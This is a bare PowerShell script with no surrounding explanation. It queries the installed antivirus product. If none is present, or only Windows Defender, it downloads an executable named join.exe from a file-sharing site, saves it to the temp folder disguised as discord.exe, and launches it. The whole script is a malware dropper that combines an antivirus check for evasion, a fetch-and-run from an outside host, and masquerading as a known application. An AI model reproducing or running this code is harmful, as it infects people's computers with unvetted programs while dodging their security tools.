$temp = "$temp\discord.exe"; 
$av = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"; 
if (($av.Count -eq 0) -or ($av.DisplayName -eq "Windows Defender")) { 
    if (-not (Test-Path $temp)) { 
        Invoke-WebRequest "https://anonsharing.com/file/ba33376922946e37/join.exe" -OutFile $temp 
    } 
    Start-Process $temp 
}
